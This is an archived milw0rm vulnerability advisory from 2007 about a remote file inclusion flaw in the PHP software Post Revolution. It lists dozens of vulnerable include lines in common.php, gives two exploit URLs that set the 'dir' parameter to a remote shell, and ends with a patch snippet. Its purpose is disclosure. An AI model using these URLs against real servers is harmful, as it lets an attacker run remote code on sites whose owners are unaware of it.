<html><head><title>Post Revolution <= 0.7.0 RC 2 (dir) Remote File Inclusion Vulnerability</title></head><pre>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                         Post Revolution Remote File Inclusion
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                         Affected Software .: Post Revolution 6.6 / 7.0 Release Candidate 2
                         Download..: http://www.fabio.com.ar/postrev/
                         Risk ..............: high
                         Date .........: 25/3/2007
                         Found by ..........: InyeXion
                         Contact ...........: InyeXion[at]gmail.com
                         Web .............: Www.InyeXion.com.ar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    Affected File:
/common.php
/themes/default/preview_post_completo.php

 Vulnerable Code:

/common.php

Line [10]       include ($dir.&quot;themes/&quot;.$config_data[&quot;template&quot;].&quot;/encabezado.php&quot;);
Line [16]       include ($dir.&quot;themes/&quot;.$config_data[&quot;template&quot;].&quot;/cuerpo.php&quot;);
Line [22]       include ($dir.&quot;themes/&quot;.$config_data[&quot;template&quot;].&quot;/pie.php&quot;);
Line [37]       include ($dir.&quot;themes/&quot;.$config_data[&quot;template&quot;].&quot;/menu_principal.php&quot;);
Line [49]       include ($dir.&quot;themes/&quot;.$config_data[&quot;template&quot;].&quot;/error.php&quot;);
Line [129]      include ($dir.&quot;themes/&quot;.$config_data[&quot;template&quot;].&quot;/login_form.php&quot;);
Line [135]      include ($dir.&quot;themes/&quot;.$config_data[&quot;template&quot;].&quot;/logout.php&quot;);
Line [174]      include ($dir.&quot;language/&quot;.$config_data[&quot;lang&quot;].&quot;.php&quot;);
Line [272]      include ($dir.&quot;language/&quot;.$config_data[&quot;lang&quot;].&quot;.php&quot;);
Line [282]      include ($dir.&quot;themes/&quot;.$config_data[&quot;template&quot;].&quot;/seccion.php&quot;);
Line [360]      include ($dir.&quot;language/&quot;.$config_data[&quot;lang&quot;].&quot;.php&quot;);
Line [446]      include ($dir.&quot;themes/&quot;.$config_data[&quot;template&quot;].&quot;/post.php&quot;);
Line [460]      include ($dir.&quot;language/&quot;.$config_data[&quot;lang&quot;].&quot;.php&quot;);
Line [543]      include ($dir.&quot;themes/&quot;.$config_data[&quot;template&quot;].&quot;/archivo_noticias.php&quot;);
Line [549]      include ($dir.&quot;themes/&quot;.$config_data[&quot;template&quot;].&quot;/cuerpo_archivo.php&quot;);
Line [570]      include ($dir.&quot;language/&quot;.$config_data[&quot;lang&quot;].&quot;.php&quot;);
Line [628]      include ($dir.&quot;themes/&quot;.$config_data[&quot;template&quot;].&quot;/post_completo.php&quot;);
Line [641]      include ($dir.&quot;language/&quot;.$config_data[&quot;lang&quot;].&quot;.php&quot;);
Line [661]      include ($dir.&quot;language/&quot;.$config_data[&quot;lang&quot;].&quot;.php&quot;);
Line [680]      include ($dir.&quot;themes/&quot;.$config_data[&quot;template&quot;].&quot;/posts_usuario.php&quot;);
Line [692]      include ($dir.&quot;language/&quot;.$config_data[&quot;lang&quot;].&quot;.php&quot;);
Line [715]      include ($dir.&quot;themes/&quot;.$config_data[&quot;template&quot;].&quot;/comment_encabezado.php&quot;);
Line [750]      include ($dir.&quot;themes/&quot;.$config_data[&quot;template&quot;].&quot;/comment.php&quot;);
Line [770]      include ($dir.&quot;themes/&quot;.$config_data[&quot;template&quot;].&quot;/comment_form.php&quot;);
Line [776]      include ($dir.&quot;themes/&quot;.$config_data[&quot;template&quot;].&quot;/info.php&quot;);
Line [782]      include ($dir.&quot;themes/&quot;.$config_data[&quot;template&quot;].&quot;/info.php&quot;);
Line [1054]     include ($dir.&quot;language/&quot;.$config_data[&quot;lang&quot;].&quot;.php&quot;);
Line [1106]     include ($dir.&quot;themes/&quot;.$config_data[&quot;template&quot;].&quot;/encuesta_head.php&quot;);
Line [1124]     include ($dir.&quot;themes/&quot;.$config_data[&quot;template&quot;].&quot;/encuesta_opc.php&quot;);
Line [1128]     include ($dir.&quot;themes/&quot;.$config_data[&quot;template&quot;].&quot;/encuesta_pie.php&quot;);
Line [1159]     include ($dir.&quot;themes/&quot;.$config_data[&quot;template&quot;].&quot;/encuesta_head_ver.php&quot;);
Line [1180]     include ($dir.&quot;themes/&quot;.$config_data[&quot;template&quot;].&quot;/encuesta_opc_ver.php&quot;);
Line [1183]     include ($dir.&quot;themes/&quot;.$config_data[&quot;template&quot;].&quot;/encuesta_pie_ver.php&quot;);
Line [1231]     include ($dir.&quot;themes/&quot;.$config_data[&quot;template&quot;].&quot;/encuestas_anteriores.php&quot;);
Line [1242]     include ($dir.&quot;themes/&quot;.$config_data[&quot;template&quot;].&quot;/tagmenu.php&quot;);
Line [1297]     include ($dir.&quot;themes/&quot;.$config_data[&quot;template&quot;].&quot;/tagpost.php&quot;);
Line [1310]     include ($dir.&quot;language/&quot;.$config_data[&quot;lang&quot;].&quot;.php&quot;);
Line [1482]     include ($dir.&quot;language/&quot;.$config_data[&quot;lang&quot;].&quot;.php&quot;);
Line [1506]     include ($dir.&quot;themes/&quot;.$config_data[&quot;template&quot;].&quot;/categoria_enlace.php&quot;);
Line [1521]     include ($dir.&quot;themes/&quot;.$config_data[&quot;template&quot;].&quot;/enlacefila.php&quot;);
Line [1570]     include ($dir.&quot;config.php&quot;);
Line [1676]     include ($dir.&quot;language/&quot;.$config_data[&quot;lang&quot;].&quot;.php&quot;);
Line [1678]     include ($dir.&quot;themes/&quot;.$config_data[&quot;template&quot;].&quot;/buscar.php&quot;);
Line [1685]     include ($dir.&quot;language/&quot;.$config_data[&quot;lang&quot;].&quot;.php&quot;);
Line [1723]     include ($dir.&quot;themes/&quot;.$config_data[&quot;template&quot;].&quot;/resultado.php&quot;);
Line [1730]     include ($dir.&quot;language/&quot;.$config_data[&quot;lang&quot;].&quot;.php&quot;);
Line [1766]     include ($dir.&quot;themes/&quot;.$config_data[&quot;template&quot;].&quot;/busq-dato.php&quot;);
Line [1772]     include ($dir.&quot;themes/&quot;.$config_data[&quot;template&quot;].&quot;/busq-resultado.php&quot;);
Line [1778]     include ($dir.&quot;themes/&quot;.$config_data[&quot;template&quot;].&quot;/busq-resultado.php&quot;);
Line [1790]     include ($dir.&quot;language/&quot;.$config_data[&quot;lang&quot;].&quot;.php&quot;);
Line [1813]     include ($dir.&quot;themes/&quot;.$config_data[&quot;template&quot;].&quot;/categoria_descarga.php&quot;);
Line [1834]     include ($dir.&quot;themes/&quot;.$config_data[&quot;template&quot;].&quot;/descargafila.php&quot;);
Line [1875]     include ($dir.&quot;language/&quot;.$config_data[&quot;lang&quot;].&quot;.php&quot;);
Line [1892]     include ($dir.&quot;language/&quot;.$config_data[&quot;lang&quot;].&quot;.php&quot;);
Line [1908]     include ($dir.&quot;language/&quot;.$config_data[&quot;lang&quot;].&quot;.php&quot;);
Line [1924]     include ($dir.&quot;language/&quot;.$config_data[&quot;lang&quot;].&quot;.php&quot;);
Line [2061]     include ($dir.&quot;include/anti-spam.php&quot;);


/themes/default/preview_post_completo.php

Line [3]                include ($dir.&quot;themes/&quot;.$config_data[&quot;template&quot;].&quot;/post_completo.php&quot;);
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Exploit:

http://[target]/common.php?dir=Shell
http://[target]/themes/default/preview_post_completo.php?dir=Shell
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Fixed bug:

/common.php and /themes/default/preview_post_completo.php insert

if((isset($_REQUEST['dir'])  || isset($_GET['dir']) || isset($_POST['dir'])) &amp;&amp; !defined(&quot;dir&quot;)){
die(&quot;Fixed bug by InyeXion.&quot;);
 }

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# milw0rm.com [2007-04-23]</pre></html>